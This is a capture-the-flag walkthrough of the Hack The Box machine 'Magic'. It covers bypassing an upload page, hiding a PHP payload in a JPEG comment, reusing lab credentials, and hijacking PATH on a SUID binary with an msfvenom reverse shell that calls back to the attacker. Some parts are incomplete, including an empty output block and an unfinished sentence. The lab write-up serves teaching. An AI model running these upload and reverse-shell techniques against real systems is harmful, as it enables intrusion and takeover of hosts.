# Magic - hackthebox

![magic badge](images/magic/badgemagic.jpg)

Magic is a Linux machine rated Medium on HTB.

## Port Scan

`nmap -sC -sV 10.10.10.185`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The SSH and HTTP ports are open.

## Bypassing Website Authentication

Dirbusting reveals `upload.php`. Presumably, it's for logged in users to upload images that were display on the index page.

As expected, trying to access `upload.php` using the browser redirects us to `login.php`.

Let's curl the page to see what's the actual response that's redirecting us.

`curl http://10.10.10.185/upload.php`

```

```

The contents of upload.php were exposed. From the contents, we can attempt to generate an upload request.

## Uploading A Payload In An Image

Instead of creating the request from scratch using Burp or python requests, we can create a stripped down version of the upload form.

```
<form action="http://10.10.10.185/upload.php" method="post" enctype="multipart/form-data">
    Select image to upload:
    <input type="file" name="image">
    <input type="submit" value="Upload Image" name="submit">
</form>
```

The form fields and attributes correspond to the exposed upload page, so it should be able to upload files to the server.

### Creating The Malicious Image

We can insert a php payload into the comment field of the jpeg file.

`wrjpgcom -comment "$(cat sorryfortheshell.php)" 5.jpeg > sorryforthis.php.jpeg`

### Uploading The Malicious Image

This image pretty much confirms that we need to look for a shellshock vulnerability here.

## Finding Cleartext Credentials

Running linpeas is a good first step for escalating privilege.

```
[+] Finding 'username' string inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
<SNIP>
/var/www/Magic/db.php5:    private static $dbUsername = 'theseus';
<SNIP>
```

The results show that `db.php5` might contain database credentials for `theseus`.

`cat db.php5`

```
<?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';
<SNIP>
```

Indeed, the files has the credentials for connecting to the database Magic on locahost.

For manual enumeration, we can 


## Dumping SQL Database

With the databse credentials, we can dump the database for further enumeration.

[The php script here](https://gist.github.com/micc83/fe6b5609b3a280e5516e2a3e9f633675) offers a simple way to dump the database as mysql is not available.

Replace the fields with the database credentials we gathered, and upload it.

`cat dump.sql`

```
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
--
-- Host: localhost    Database: Magic
-- ------------------------------------------------------
-- Server version	5.7.29-0ubuntu0.18.04.1
<SNIP>
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
<SNIP>
```

We found another set of credentials.

* username: admin
* password: Th3s3usW4sK1ng

While they are credentials for the Magic website, the password could have been reused.

In this case, it is also theseus' account password. We can switch to his account with the command below.

`su theseus`

## Finding SUID Binary

Basic enumeration reveals that theseus belong to the `users` group.

```
$ id
uid=1000(theseus) gid=1000(theseus) groups=1000(theseus),100(users)
```

We can look for files belonging to the `users` group.

```
$ find / -group users 2>/dev/null
/bin/sysinfo
```

We find a binary sysinfo, and as part of the `users` group, we have read and execute permissions over it.

`-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo`

The setuid bit is on, so this binary runs with its owner's permissions (root). 

## Examining The Binary

Executing the binary returns a system report on the machine's hardware.

Running the strings command on it reveals more useful information.

`strings sysinfo`

```
<SNIP>
====================Hardware Info====================
lshw -short
====================Disk Info====================
fdisk -l
====================CPU Info====================
cat /proc/cpuinfo
====================MEM Usage=====================
<SNIP>
```

We see that it calls the three binaries above. And more importantly, it did not call them by their full path.

This is a vulnerability we can take advantage off.

## Exploiting SUID

This [command](https://opensource.com/article/17/6/set-path-linux) below will add the `/tmp` directory to our path variable. This means that the shell will look in the `/tmp` directory first when any binary is called by its name (and not its full path).

`export PATH=/tmp:$PATH`

Next, generate a binary payload with msfvenom.

`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.X.X LPORT=9999 -f elf > lshw`

Then, place the generated payload `lshw` in the `/tmp` directory.

Finally, execute `sysinfo`.

When executed, it executes `lshw` as root. But due to our altered $PATH, the program searches for `lshw` in `/tmp` and executes it.

Hence, instead of executing the actual lshw tool, it executes our payload at `/tmp/lshw` as **root**, causing a reverse shell to connect back to us.

```
root@kali:~/htb/magic# nc -nvlp 9999
listening on [any] 9999 ...
connect to [10.10.X.X] from (UNKNOWN) [10.10.10.185] 45218
whoami
root
```

## Thoughts

This is an enjoyable box that reinforces some fundamentals.

**References**
SUID

* https://percussiveelbow.github.io/linux-privesc/
* https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/

PHP

* https://www.w3schools.com/php/php_file_upload.asp